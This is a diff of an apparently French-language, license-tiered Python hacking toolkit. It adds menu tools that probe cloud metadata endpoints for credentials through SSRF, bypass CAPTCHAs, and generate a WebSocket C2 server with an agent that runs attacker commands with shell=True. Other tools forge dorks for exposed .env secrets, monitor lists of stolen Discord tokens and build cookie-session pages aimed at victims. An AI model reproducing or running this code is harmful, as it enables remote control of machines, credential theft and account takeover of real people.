+        ("AWS user-data", "http://169.254.169.254/latest/user-data"),
+        ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/"),
+        ("GCP token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
+        ("Azure IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+        ("DigitalOcean", "http://169.254.169.254/metadata/v1/"),
+        ("Alibaba", "http://100.100.100.200/latest/meta-data/"),
+    ]
+    print(f"\n{INF} Test de {len(targets)} endpoints...\n")
+    for name, url in targets:
+        try:
+            r = requests.get(ssrf_url + urllib.parse.quote(url, safe=""), timeout=6)
+            if r.status_code == 200 and len(r.text) > 3:
+                print(f"  {R}[SSRF OK]{RST} {name}")
+                print(f"    {DIM}{r.text[:200]}{RST}")
+                out(f"cloudmeta_{name.replace(' ','_')}.txt", r.text[:5000])
+        except: pass
+    pause()
+
+
+def vipx_tls_randomizer():
+    banner_s("TLS FINGERPRINT RANDOMIZER")
+    url = ask("URL a tester:")
+    print(f"  {Y}[1]{RST}Chrome 120 Win {Y}[2]{RST}Firefox 121 Linux {Y}[3]{RST}Safari 17 Mac")
+    c = ask("Emuler:", "1")
+    profiles = {
+        "1": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
+            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"',
+            "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Upgrade-Insecure-Requests": "1",
+        },
+        "2": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
+            "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Upgrade-Insecure-Requests": "1",
+        },
+        "3": {
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
+        },
+    }
+    headers = profiles.get(c, profiles["1"])
+    print(f"\n{INF} Requete avec profil {c}...\n")
+    try:
+        r = requests.get(url, headers=headers, timeout=10)
+        print(f"  {G}Status{RST} : {r.status_code}")
+        print(f"  {G}Server{RST} : {r.headers.get('Server', '?')}")
+        print(f"  {G}CF-Ray{RST} : {r.headers.get('CF-Ray', '-')}")
+        if "cf-mitigated" in [k.lower() for k in r.headers.keys()]:
+            print(f"  {R}[CHALLENGE]{RST} Cloudflare triggered")
+        else:
+            print(f"  {G}[PASS]{RST} Pas de challenge")
+    except Exception as e: print(f"{ERR} {e}")
+    pause()
+
+
+def vipx_behavior_captcha():
+    banner_s("BEHAVIORAL CAPTCHA BYPASS")
+    n_points = ask_int("Nombre de points:", 200)
+    def bezier(p0, p1, p2, t):
+        return ((1-t)**2 * p0[0] + 2*(1-t)*t*p1[0] + t**2 * p2[0],
+                (1-t)**2 * p0[1] + 2*(1-t)*t*p1[1] + t**2 * p2[1])
+    def human_curve(p0, p1, p2, n):
+        pts = []
+        for i in range(n):
+            t = i / (n - 1)
+            x, y = bezier(p0, p1, p2, t)
+            x += random.gauss(0, 1.5); y += random.gauss(0, 1.5)
+            pts.append((int(x), int(y)))
+        return pts
+    p0 = (random.randint(100, 300), random.randint(100, 300))
+    p2 = (random.randint(700, 1000), random.randint(400, 700))
+    p1 = (random.randint(p0[0], p2[0]), random.randint(p0[1] - 100, p2[1] + 100))
+    pts = human_curve(p0, p1, p2, n_points)
+    script = f'''# -*- coding: utf-8 -*-
+# Behavioral captcha bypass
+import ctypes, time, random
+pts = {pts}
+user32 = ctypes.windll.user32
+for i, (x, y) in enumerate(pts):
+    user32.SetCursorPos(x, y)
+    time.sleep(random.uniform(0.008, 0.045))
+    if i % 7 == 0:
+        user32.SetCursorPos(x + random.randint(-1,1), y + random.randint(-1,1))
+print("Mouvement termine")
+'''
+    os.makedirs("1-Output", exist_ok=True)
+    p = "1-Output/behavior_move.py"
+    open(p, "w", encoding="utf-8").write(script)
+    print(f"\n{OK} -> {Y}{p}{RST}")
+    print(f"  {DIM}{n_points} points Bezier + jitter gaussien{RST}")
+    if ask("Tester maintenant? (y/n):", "n").lower() == "y":
+        if platform.system() == "Windows":
+            try:
+                user32 = ctypes.windll.user32
+                for x, y in pts:
+                    user32.SetCursorPos(x, y)
+                    time.sleep(random.uniform(0.008, 0.035))
+            except: pass
+    pause()
+
+
+def vipx_ws_c2():
+    banner_s("WEBSOCKET C2")
+    port = ask_int("Port serveur:", 8443)
+    token = ask("Auth token:", "leakfr-" + str(random.randint(1000,9999)))
+    server = f'''# -*- coding: utf-8 -*-
+import asyncio, json
+try: import websockets
+except:
+    import subprocess, sys
+    subprocess.run([sys.executable, "-m", "pip", "install", "websockets", "--quiet"])
+    import websockets
+TOKEN = "{token}"
+AGENTS = {{}}
+async def handler(ws):
+    try:
+        first = await ws.recv()
+        data = json.loads(first)
+        if data.get("token") != TOKEN:
+            await ws.close(); return
+        aid = data.get("id", "unknown")
+        AGENTS[aid] = ws
+        print(f"[+] Agent: {{aid}}")
+        async for msg in ws: print(f"[{{aid}}] {{msg}}")
+    except Exception as e: print("err:", e)
+    finally:
+        for k, v in list(AGENTS.items()):
+            if v is ws: del AGENTS[k]
+async def cmd_loop():
+    while True:
+        await asyncio.sleep(0.1)
+        if not AGENTS: continue
+        cmd = await asyncio.get_event_loop().run_in_executor(None, input, "C2> ")
+        if not cmd: continue
+        for aid, ws in list(AGENTS.items()):
+            try: await ws.send(cmd)
+            except: pass
+async def main():
+    async with websockets.serve(handler, "0.0.0.0", {port}):
+        print(f"WS C2 port {port}, token={TOKEN}")
+        await cmd_loop()
+asyncio.run(main())
+'''
+    agent = f'''# -*- coding: utf-8 -*-
+import asyncio, os, socket, subprocess, json, base64
+try: import websockets
+except:
+    import subprocess, sys
+    subprocess.run([sys.executable, "-m", "pip", "install", "websockets", "--quiet"])
+    import websockets
+SERVER = "ws://TON-IP:{port}"
+TOKEN = "{token}"
+AID = socket.gethostname() + "-" + base64.b64encode(os.urandom(4)).decode()[:6]
+async def run():
+    while True:
+        try:
+            async with websockets.connect(SERVER) as ws:
+                await ws.send(json.dumps({{"token": TOKEN, "id": AID}}))
+                async for cmd in ws:
+                    try:
+                        out = subprocess.run(cmd, shell=True, capture_output=True, timeout=20)
+                        resp = (out.stdout + out.stderr).decode("utf-8", errors="replace")
+                        await ws.send(resp[:4000] or "(no output)")
+                    except Exception as e:
+                        await ws.send(f"err: {{e}}")
+        except Exception: await asyncio.sleep(5)
+asyncio.run(run())
+'''
+    os.makedirs("1-Output", exist_ok=True)
+    open("1-Output/ws_c2_server.py", "w").write(server)
+    open("1-Output/ws_c2_agent.py", "w").write(agent)
+    print(f"\n{OK} -> {Y}1-Output/ws_c2_server.py{RST}")
+    print(f"{OK} -> {Y}1-Output/ws_c2_agent.py{RST}")
+    print(f"  {DIM}Edite TON-IP dans l'agent.{RST}")
+    pause()
+
+
+def vipx_mass_email_verify():
+    banner_s("MASS EMAIL VERIFIER")
+    fp = ask("Fichier emails (1/ligne):")
+    if not os.path.isfile(fp): print(f"{ERR} Introuvable."); pause(); return
+    emails = [l.strip() for l in open(fp, errors="ignore") if l.strip() and "@" in l]
+    print(f"\n{INF} Verification de {len(emails)} emails...\n")
+    valid, invalid, unknown = [], [], []
+    for e in emails:
+        if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", e):
+            invalid.append(e); continue
+        domain = e.split("@")[1].lower()
+        try:
+            r = subprocess.run(["nslookup", "-type=MX", domain],
+                               capture_output=True, text=True, timeout=5).stdout
+            has_mx = "mail exchanger" in r.lower() or "MX preference" in r
+            if not has_mx:
+                try: socket.gethostbyname(domain); has_mx = True
+                except: pass
+            if has_mx:
+                valid.append(e); print(f"  {G}[VALID]{RST} {e}")
+            else:
+                invalid.append(e); print(f"  {R}[NO-MX]{RST} {e}")
+        except:
+            unknown.append(e); print(f"  {Y}[UNK]{RST} {e}")
+        time.sleep(0.3)
+    print(f"\n{BLOOD_MID}-- RAPPORT --{RESET_ANSI}")
+    print(f"  {G}Valides{RST}   : {len(valid)}")
+    print(f"  {R}Invalides{RST} : {len(invalid)}")
+    print(f"  {Y}Inconnus{RST}  : {len(unknown)}")
+    if valid: out("emails_valid.txt", "\n".join(valid))
+    if invalid: out("emails_invalid.txt", "\n".join(invalid))
+    pause()
+
+
+def vipx_dork_forge():
+    banner_s("DORK FORGE")
+    cat = ask("[1]WordPress [2]Cameras [3]Printers [4]Backups [5].env [6]Custom:", "1")
+    target = ask("Domaine ou vide:", "")
     forge = {
         "1": ["inurl:wp-content/plugins", "inurl:wp-config.php.bak", "inurl:wp-json/wp/v2/users",
-              "inurl:/wp-content/uploads/ filetype:sql", "inurl:wp-admin intext:mot de passe",
-              'intitle:"Index of" wp-content'],
+              "inurl:/wp-content/uploads/ filetype:sql", "inurl:wp-admin intext:mot de passe"],
         "2": ['intitle:"Live View / - AXIS"', "inurl:/view.shtml", 'intitle:"netcam"',
-              'intitle:"webcam 7"', 'intitle:"Network Camera"', "inurl:/cgi-bin/mjpg/video.cgi"],
-        "3": ["intitle:HPDial", 'intitle:"Web Image Monitor"', "inurl:/printer/main.html",
-              'intitle:"Welcome to the CUPS"', "port:9100"],
+              'intitle:"Network Camera"', "inurl:/cgi-bin/mjpg/video.cgi"],
+        "3": ["intitle:HPDial", 'intitle:"Web Image Monitor"', "inurl:/printer/main.html", "port:9100"],
         "4": ['intitle:"Index of" backup', 'intitle:"Index of" .bak', 'intitle:"Index of" dump.sql',
-              'intitle:"Index of" *.sql', "inurl:backup.zip", "inurl:.tar.gz"],
+              "inurl:backup.zip", "inurl:.tar.gz"],
         "5": ["filetype:env DB_PASSWORD", "filetype:env SECRET_KEY", "filetype:env AWS_ACCESS",
-              "filetype:env mail_password", "inurl:.env intext:APP_KEY"],
+              "inurl:.env intext:APP_KEY"],
     }
     dorks = list(forge.get(cat, []))
     if cat == "6":
-        base = ask("Mot-cle de base:")
+        base = ask("Mot-cle:")
         for mod in ["inurl:", "intitle:", "intext:", "filetype:", "ext:", "site:"]:
             dorks.append(f"{mod}{base}")
-    if target:
-        dorks = [f"site:{target} {d}" for d in dorks]
-
+    if target: dorks = [f"site:{target} {d}" for d in dorks]
     print(f"\n{BLOOD_MID}──[ {len(dorks)} DORKS ]──{RESET_ANSI}\n")
-    for i, d in enumerate(dorks, 1):
-        print(f"  {G}[{i:>2}]{RST} {W}{d}{RST}")
+    for i, d in enumerate(dorks, 1): print(f"  {G}[{i:>2}]{RST} {W}{d}{RST}")
     if ask("\nSauvegarder? (y/n):", "y").lower() == "y":
         out(f"dorks_cat{cat}.txt", "\n".join(dorks))
-    if ask("Ouvrir dans Google? (n si tu preferes copier):", "n").lower() == "y":
-        import webbrowser
-        for d in dorks[:5]:
-            webbrowser.open(f"https://google.com/search?q={urllib.parse.quote(d)}")
-            time.sleep(0.5)
     pause()
 
 
@@ -3398,10 +4120,9 @@ def vipx_friend_graph():
     uid = ask("User ID de depart:")
     depth = ask_int("Profondeur (1-3):", 2)
     max_per = ask_int("Max amis par noeud:", 20)
-    seen = set()
-    edges = []
+    seen = set(); edges = []
     queue = [(uid, 0)]
-    print(f"\n{INF} Cartographie en cours...\n")
+    print(f"\n{INF} Cartographie...\n")
     while queue:
         cur, lvl = queue.pop(0)
         if cur in seen or lvl > depth: continue
@@ -3410,14 +4131,11 @@ def vipx_friend_graph():
             r = requests.get(f"https://friends.roblox.com/v1/users/{cur}/friends?limit={max_per}", timeout=6).json()
             friends = r.get("data", [])
             for f in friends:
-                fid = str(f.get("id"))
-                name = f.get("name", "?")
+                fid = str(f.get("id")); name = f.get("name", "?")
                 edges.append(f"{cur} -> {fid} ({name})")
-                if fid not in seen and lvl + 1 <= depth:
-                    queue.append((fid, lvl + 1))
+                if fid not in seen and lvl + 1 <= depth: queue.append((fid, lvl + 1))
             print(f"  {G}[L{lvl}]{RST} {cur} : {len(friends)} amis")
-        except Exception as e:
-            print(f"  {R}[ERR]{RST} {cur}: {e}")
+        except: pass
         time.sleep(0.6)
     print(f"\n{OK} {len(seen)} comptes, {len(edges)} relations.")
     out(f"friend_graph_{uid}.txt", "\n".join(edges))
@@ -3426,43 +4144,27 @@ def vipx_friend_graph():
 
 def vipx_session_link():
     banner_s("SESSION LINK BUILDER")
-    print(f"  {DIM}Genere une page HTML qui force la session d'un cookie donne.{RST}")
-    print(f"  {DIM}A heberger sur ton serveur, envoyer le lien a la victime.{RST}\n")
     plateforme = ask("[1]Discord [2]Roblox [3]Custom:", "1")
     cookie = ask("Cookie (valeur complete):")
-    redir = ask("Redirect apres login (URL):", "https://google.com")
-
+    redir = ask("Redirect apres login:", "https://google.com")
     if plateforme == "1":
-        cname = "token"
-        target = "https://discord.com/channels/@me"
         setter = f'document.cookie = "token={cookie}; path=/; domain=.discord.com";'
     elif plateforme == "2":
-        cname = ".ROBLOSECURITY"
-        target = "https://www.roblox.com/home"
         setter = f'document.cookie = ".ROBLOSECURITY={cookie}; path=/; domain=.roblox.com";'
     else:
         cname = ask("Nom cookie:", "session")
-        target = ask("URL cible:", "https://google.com")
         setter = f'document.cookie = "{cname}={cookie}; path=/";'
-
-    html = f'''<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>Chargement...</title>
-<style>body{{background:#111;color:#eee;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
-.spinner{{width:50px;height:50px;border:4px solid #333;border-top-color:#e00;border-radius:50%;animation:spin 1s linear infinite}}
-@keyframes spin{{to{{transform:rotate(360deg)}}}}</style></head>
-<body><div class="spinner"></div>
-<script>
-    try {{ {setter} }} catch (e) {{ console.log(e); }}
-    setTimeout(() => {{ window.location.href = "{redir}"; }}, 800);
-</script>
-</body></html>'''
+    html = f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>...</title>
+<style>body{{background:#111;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif}}
+.s{{width:50px;height:50px;border:4px solid #333;border-top-color:#e00;border-radius:50%;animation:sp 1s linear infinite}}
+@keyframes sp{{to{{transform:rotate(360deg)}}}}</style></head><body><div class="s"></div>
+<script>try {{ {setter} }} catch(e) {{}}
+setTimeout(() => {{ window.location.href = "{redir}"; }}, 800);</script></body></html>'''
     os.makedirs("1-Output", exist_ok=True)
     p = f"1-Output/session_{plateforme}_{int(time.time())}.html"
     open(p, "w", encoding="utf-8").write(html)
     print(f"\n{OK} -> {Y}{p}{RST}")
-    print(f"  {DIM}python -m http.server 8080 puis envoie http://ton_ip:8080/<fichier>{RST}")
-    print(f"  {DIM}Note : le cookie ne peut PAS etre set par JS sur un domaine que tu ne controles pas.{RST}")
-    print(f"  {DIM}Cette page fonctionne SI elle est hebergee sur le domaine cible.{RST}")
+    print(f"  {DIM}Ne fonctionne QUE si heberge sur le domaine cible.{RST}")
     pause()
 
 
@@ -3470,50 +4172,34 @@ def vipx_token_monitor():
     banner_s("TOKEN HEALTH MONITOR")
     p = ask("Fichier tokens .txt:")
     if not os.path.isfile(p): print(f"{ERR} Introuvable."); pause(); return
-    interval = ask_int("Intervalle check (sec):", 30)
-    wh_alert = ask("Webhook alertes (optionnel):", "")
+    interval = ask_int("Intervalle (sec):", 30)
+    wh_alert = ask("Webhook alertes:", "")
     tokens = [l.strip() for l in open(p, errors="ignore") if l.strip()]
-    if not tokens: print(f"{ERR} Vide."); pause(); return
-
     print(f"\n{INF} Monitoring {len(tokens)} tokens. Ctrl+C pour stop.\n")
-    state = {}
-    cycle = 0
+    state = {}; cycle = 0
     try:
         while True:
             cycle += 1
-            print(f"\n  {BLOOD_MID}-- Cycle {cycle} [{datetime.now().strftime('%H:%M:%S')}] --{RESET_ANSI}")
-            for i, t in enumerate(tokens):
-                short = t[:12] + "..."
+            print(f"\n  {BLOOD_MID}-- Cycle {cycle} --{RESET_ANSI}")
+            for t in tokens:
                 try:
                     r = requests.get("https://discord.com/api/v9/users/@me", headers=_dh(t), timeout=5)
                     if r.status_code == 200:
-                        d = r.json()
-                        user = d.get("username", "?")
-                        prev = state.get(t, "unknown")
-                        if prev == "dead":
-                            print(f"  {G}[REVIVED]{RST} {user}")
-                            if wh_alert:
-                                requests.post(wh_alert, json={"content": f"Token revivifie: **{user}**\n`{t}`"}, timeout=5)
-                        else:
-                            print(f"  {G}[ALIVE]{RST} {user}")
+                        u = r.json().get("username", "?")
+                        if state.get(t) == "dead":
+                            print(f"  {G}[REVIVED]{RST} {u}")
+                            if wh_alert: requests.post(wh_alert, json={"content": f"Revivifie: **{u}**"}, timeout=5)
+                        else: print(f"  {G}[ALIVE]{RST} {u}")
                         state[t] = "alive"
                     elif r.status_code == 401:
-                        prev = state.get(t, "unknown")
-                        if prev != "dead":
-                            print(f"  {R}[DEAD]{RST} {short}")
-                            if wh_alert:
-                                requests.post(wh_alert, json={"content": f"Token mort:\n`{t}`"}, timeout=5)
-                        else:
-                            print(f"  {DIM}[still dead]{RST} {short}")
+                        if state.get(t) != "dead":
+                            print(f"  {R}[DEAD]{RST} {t[:12]}...")
+                            if wh_alert: requests.post(wh_alert, json={"content": f"Mort:\n`{t}`"}, timeout=5)
                         state[t] = "dead"
-                    else:
-                        print(f"  {Y}[{r.status_code}]{RST} {short}")
-                except Exception as e:
-                    print(f"  {Y}[net err]{RST} {short}")
+                except: pass
                 time.sleep(0.3)
             time.sleep(interval)
-    except KeyboardInterrupt:
-        pass
+    except KeyboardInterrupt: pass
     print(f"\n{OK} Monitoring arrete.")
     pause()
 
@@ -3521,56 +4207,80 @@ def vipx_token_monitor():
 def vipx_email_footprint():
     banner_s("EMAIL FOOTPRINT RECON")
     email = ask("Email cible:").lower()
-    if not email: print(f"{ERR} Vide."); pause(); return
-    print(f"\n{INF} Check inscriptions sur services connus...\n")
+    if not email: pause(); return
+    print(f"\n{INF} Check services...\n")
+    handle = email.split("@")[0]
     checks = [
-        ("GitHub", f"https://github.com/{email.split('@')[0]}", "text"),
-        ("Gravatar", f"https://gravatar.com/avatar/{hashlib.md5(email.encode()).hexdigest()}?d=404", "status"),
-        ("HIBP", f"https://haveibeenpwned.com/account/{email}", "text"),
-        ("Pinterest", f"https://pinterest.com/{email.split('@')[0]}", "text"),
-        ("Spotify", f"https://open.spotify.com/user/{email.split('@')[0]}", "text"),
-        ("Twitter/X", f"https://nitter.privacydev.net/{email.split('@')[0]}", "text"),
-        ("Reddit", f"https://reddit.com/user/{email.split('@')[0]}", "text"),
+        ("GitHub", f"https://github.com/{handle}"),
+        ("Gravatar", f"https://gravatar.com/avatar/{hashlib.md5(email.encode()).hexdigest()}?d=404"),
+        ("Pinterest", f"https://pinterest.com/{handle}"),
+        ("Reddit", f"https://reddit.com/user/{handle}"),
     ]
-    for name, url, mode in checks:
+    for name, url in checks:
         try:
             r = requests.get(url, timeout=6, headers={"User-Agent": "Mozilla/5.0"})
             found = r.status_code == 200 and "not found" not in r.text.lower()[:1000]
-            print(f"  {G if found else DIM}[{'FOUND' if found else '---'}]{RST} {name:<14} {url[:70]}")
-        except:
-            print(f"  {DIM}[ERR]{RST} {name}")
-    print(f"\n  {Y}Gravatar direct{RST} : https://gravatar.com/avatar/{hashlib.md5(email.encode()).hexdigest()}")
-    print(f"  {Y}Dehashed{RST}       : https://dehashed.com/search?query={email}")
-    print(f"  {Y}HIBP{RST}           : https://haveibeenpwned.com/account/{email}")
+            print(f"  {G if found else DIM}[{'FOUND' if found else '---'}]{RST} {name}")
+        except: print(f"  {DIM}[ERR]{RST} {name}")
+    print(f"\n  {Y}Gravatar{RST} : https://gravatar.com/avatar/{hashlib.md5(email.encode()).hexdigest()}")
+    print(f"  {Y}HIBP{RST}    : https://haveibeenpwned.com/account/{email}")
     pause()
 
 
 def vipx_menu():
     banner_s("VIP+ PANEL")
     if not _has_tier("vip+"):
-        print(f"  {R}[X]{RST} Acces reserve aux licences VIP+.")
+        print(f"  {R}[X]{RST} Acces reserve aux licences VIP+ et superieures.")
         print(f"  {DIM}Tier actuel : {W}{_TIER}{RESET_ANSI}")
         pause(); return
     _page_loader(f"Ouverture VIP+ ({_TIER})")
     while True:
         menu_box(f"*** VIP+ PANEL [{_TIER.upper()}] ***", [
-            ("1", "AI Dork Forge"),
-            ("2", "Roblox Friend Graph"),
-            ("3", "Session Link Builder"),
-            ("4", "Token Health Monitor"),
-            ("5", "Email Footprint Recon"),
+            ("1", "Multi-Site Combo Validator"),
+            ("2", "Adaptive Rate Limiter"),
+            ("3", "WAF Fingerprinter"),
+            ("4", "DNS Rebinding Server"),
+            ("5", "Browser Extension Dropper"),
+            ("6", "Git History Secret Miner"),
+            ("7", "JWT Forge + Attack"),
+            ("8", "Subdomain Takeover"),
+            ("9", "Password Pattern Cracker"),
+            ("10", "Cloud Metadata Extractor"),
+            ("11", "TLS Fingerprint Randomizer"),
+            ("12", "Behavioral Captcha Bypass"),
+            ("13", "WebSocket C2"),
+            ("14", "Mass Email Verifier"),
+            ("15", "Dork Forge"),
+            ("16", "Roblox Friend Graph"),
+            ("17", "Session Link Builder"),
+            ("18", "Token Health Monitor"),
+            ("19", "Email Footprint Recon"),
             ("0", "Retour")], color=PLUS_COL)
         c = input(f"  {PLUS_COL}VIP+>{RST} ").strip()
-        if c == "1": vipx_dork_forge()
-        elif c == "2": vipx_friend_graph()
-        elif c == "3": vipx_session_link()
-        elif c == "4": vipx_token_monitor()
-        elif c == "5": vipx_email_footprint()
+        if c == "1": vipx_combo_validator()
+        elif c == "2": vipx_rate_limiter()
+        elif c == "3": vipx_waf_fingerprint()
+        elif c == "4": vipx_dns_rebind()
+        elif c == "5": vipx_ext_dropper()
+        elif c == "6": vipx_git_miner()
+        elif c == "7": vipx_jwt_forge()
+        elif c == "8": vipx_subdomain_takeover()
+        elif c == "9": vipx_password_crack()
+        elif c == "10": vipx_cloud_metadata()
+        elif c == "11": vipx_tls_randomizer()
+        elif c == "12": vipx_behavior_captcha()
+        elif c == "13": vipx_ws_c2()
+        elif c == "14": vipx_mass_email_verify()
+        elif c == "15": vipx_dork_forge()
+        elif c == "16": vipx_friend_graph()
+        elif c == "17": vipx_session_link()
+        elif c == "18": vipx_token_monitor()
+        elif c == "19": vipx_email_footprint()
         elif c == "0": break
 
 
 # ========================================================================
-# AMI PANEL -- FEATURES PERSONNELLES
+# AMI PANEL
 # ========================================================================
 _AMI_DIR = "1-Output/.ami"
 _BRAND_FILE = os.path.join(_AMI_DIR, ".brand")
@@ -3585,7 +4295,6 @@ def _load_brand():
 
 def ami_brand():
     banner_s("CUSTOM BRANDING")
-    print(f"  {DIM}Pseudo affiche en haut du banner sur chaque page.{RST}\n")
     cur = _load_brand()
     if cur: print(f"  {Y}Pseudo actuel{RST} : {G}{cur}{RST}\n")
     new = ask("Nouveau pseudo (vide pour effacer):")
@@ -3607,26 +4316,21 @@ def _xor(data, key):
 
 def ami_vault():
     banner_s("PERSONAL VAULT")
-    print(f"  {DIM}Notes/creds chiffrees localement (XOR-SHA256).{RST}\n")
     pw = ask("Mot de passe vault:")
     if not pw: print(f"{ERR} Vide."); pause(); return
     k = _vault_key(pw)
     os.makedirs(_AMI_DIR, exist_ok=True)
-
     if os.path.isfile(_VAULT_FILE):
         try:
             blob = open(_VAULT_FILE, "rb").read()
             plain = _xor(blob, k)
-            # test integrite : si dechiffre mais garbage, on continue quand meme
             try: data = json.loads(plain.decode())
             except: data = {"notes": [], "creds": []}
-        except:
-            data = {"notes": [], "creds": []}
+        except: data = {"notes": [], "creds": []}
     else:
         data = {"notes": [], "creds": []}
-
     while True:
-        print(f"\n  {Y}[1]{RST}Ajouter note  {Y}[2]{RST}Ajouter cred  {Y}[3]{RST}Lister  {Y}[4]{RST}Sauver+Quitter")
+        print(f"\n  {Y}[1]{RST}Note  {Y}[2]{RST}Cred  {Y}[3]{RST}Lister  {Y}[4]{RST}Sauver+Quitter")
         c = ask("Action:", "3")
         if c == "1":
             title = ask("Titre:"); body = ask("Contenu:")
@@ -3651,32 +4355,6 @@ def ami_vault():
     pause()
 
 
-def ami_relay():
-    banner_s("PRIORITY RELAY")
-    print(f"  {DIM}Envoie un message direct a l'owner (Discord).{RST}\n")
-    wh = ask("Webhook owner:", "")
-    if not wh:
-        wh = _load_ami_relay()
-        if not wh:
-            print(f"{ERR} Aucun webhook configure."); pause(); return
-        print(f"  {DIM}Utilise : {wh[:60]}...{RST}")
-    else:
-        _save_ami_relay(wh)
-    msg = ask("Message a envoyer:")
-    if not msg: print(f"{ERR} Vide."); pause(); return
-    try:
-        r = requests.post(wh, json={"embeds": [{
-            "title": f"[RELAY] {_BRAND or 'AMI'}",
-            "color": 0xFF00AA,
-            "description": msg,
-            "fields": [{"name": "HWID", "value": _hwid()[:16], "inline": True},
-                       {"name": "Tier", "value": _TIER, "inline": True}],
-            "timestamp": datetime.utcnow().isoformat() + "Z"}]}, timeout=8)
-        print(f"{OK if r.status_code in [200, 204] else ERR} {r.status_code}")
-    except Exception as e: print(f"{ERR} {e}")
-    pause()
-
-
 def _save_ami_relay(wh):
     os.makedirs(_AMI_DIR, exist_ok=True)
     open(os.path.join(_AMI_DIR, ".relay"), "w").write(wh)
@@ -3687,29 +4365,48 @@ def _load_ami_relay():
     except Exception: return ""
 
 
+def ami_relay():
+    banner_s("PRIORITY RELAY")
+    wh = ask("Webhook owner:", "")
+    if not wh:
+        wh = _load_ami_relay()
+        if not wh:
+            print(f"{ERR} Aucun webhook."); pause(); return
+        print(f"  {DIM}Utilise : {wh[:60]}...{RST}")
+    else:
+        _save_ami_relay(wh)
+    msg = ask("Message:")
+    if not msg: print(f"{ERR} Vide."); pause(); return
+    try:
+        r = requests.post(wh, json={"embeds": [{
+            "title": f"[RELAY] {_BRAND or 'AMI'}", "color": 0xFF00AA,
+            "description": msg,
+            "fields": [{"name": "HWID", "value": _hwid()[:16], "inline": True},
+                       {"name": "Tier", "value": _TIER, "inline": True}],
+            "timestamp": datetime.utcnow().isoformat() + "Z"}]}, timeout=8)
+        print(f"{OK if r.status_code in [200, 204] else ERR} {r.status_code}")
+    except Exception as e: print(f"{ERR} {e}")
+    pause()
+
+
 def ami_presets():
     banner_s("TOOL PRESETS")
-    print(f"  {DIM}Sauvegarde et reutilise des configs d'outils.{RST}\n")
     os.makedirs(_AMI_DIR, exist_ok=True)
     if os.path.isfile(_PRESETS_FILE):
         try: presets = json.load(open(_PRESETS_FILE))
         except: presets = {}
     else:
         presets = {}
-
     print(f"  {Y}[1]{RST}Voir  {Y}[2]{RST}Ajouter  {Y}[3]{RST}Supprimer  {Y}[0]{RST}Retour")
     c = ask("Action:", "1")
     if c == "1":
-        if not presets:
-            print(f"  {DIM}Vide.{RST}")
+        if not presets: print(f"  {DIM}Vide.{RST}")
         else:
             for name, data in presets.items():
                 print(f"\n  {G}{name}{RST}")
-                for k, v in data.items():
-                    print(f"    {Y}{k}{RST} = {W}{v}{RST}")
+                for k, v in data.items(): print(f"    {Y}{k}{RST} = {W}{v}{RST}")
     elif c == "2":
         name = ask("Nom preset:")
-        print(f"  {DIM}Champs: target, port, webhook, lhost, lport...{RST}")
         fields = {}
         while True:
             k = ask("Champ (vide pour finir):")
@@ -3731,14 +4428,14 @@ def ami_presets():
 
 
 def ami_menu():
-    banner_s("AMI PANEL -- ACCES PRIVE")
+    banner_s("AMI PANEL")
     if not _has_tier("ami"):
-        print(f"  {R}[X]{RST} Acces reserve aux licences AMI.")
+        print(f"  {R}[X]{RST} Acces reserve aux licences AMI et owner.")
         print(f"  {DIM}Tier actuel : {W}{_TIER}{RESET_ANSI}")
         pause(); return
     _page_loader(f"Ouverture AMI ({_BRAND or 'anonyme'})")
     while True:
-        menu_box(f"*** AMI PANEL ***", [
+        menu_box("*** AMI PANEL ***", [
             ("1", "Custom Branding"),
             ("2", "Personal Vault"),
             ("3", "Priority Relay (owner)"),
@@ -3753,14 +4450,125 @@ def ami_menu():
 
 
 # ========================================================================
-# LICENSE / ACTIVATION (remote, tiers)
+# SETTINGS
 # ========================================================================
-_PRESET_KEY  = ""                                    # colle ta cle ici pour auto-activation
+_SETTINGS_DIR = "1-Output"
+_SETTINGS_FILE = os.path.join(_SETTINGS_DIR, ".settings")
+
+_DEFAULT_SETTINGS = {
+    "auto_activate": True,      # utilise preset_key si dispo et pas de licence
+    "preset_key": "",           # cle utilisee pour l'auto-activation
+    "remember_license": True,   # garde .leakfr_license entre les sessions
+    "clear_cache_on_boot": False,  # supprime la licence au demarrage
+    "loader_on": True,          # animation de chargement
+    "show_tier_badge": True,    # badge tier dans le banner
+    "verbose_server": False,    # affiche les reponses serveur brutes
+}
+_SETTINGS = dict(_DEFAULT_SETTINGS)
+
+
+def _load_settings():
+    global _SETTINGS, LOADER_ON
+    _SETTINGS = dict(_DEFAULT_SETTINGS)
+    if os.path.isfile(_SETTINGS_FILE):
+        try:
